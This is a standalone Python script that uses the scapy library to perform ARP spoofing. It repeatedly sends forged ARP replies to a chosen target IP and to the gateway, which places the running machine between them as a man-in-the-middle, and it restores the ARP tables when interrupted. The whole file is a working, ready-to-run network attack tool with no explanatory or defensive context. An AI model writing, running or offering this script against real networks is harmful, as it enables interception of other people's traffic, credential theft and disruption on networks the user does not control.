#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Could not find MAC address for IP: {ip}")
        sys.exit(1)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main(target_ip, gateway_ip):
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ..... Quitting.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
    parser.add_argument("target_ip", help="Target IP Address")
    parser.add_argument("gateway_ip", help="Gateway IP Address")
    args = parser.parse_args()

    main(args.target_ip, args.gateway_ip)
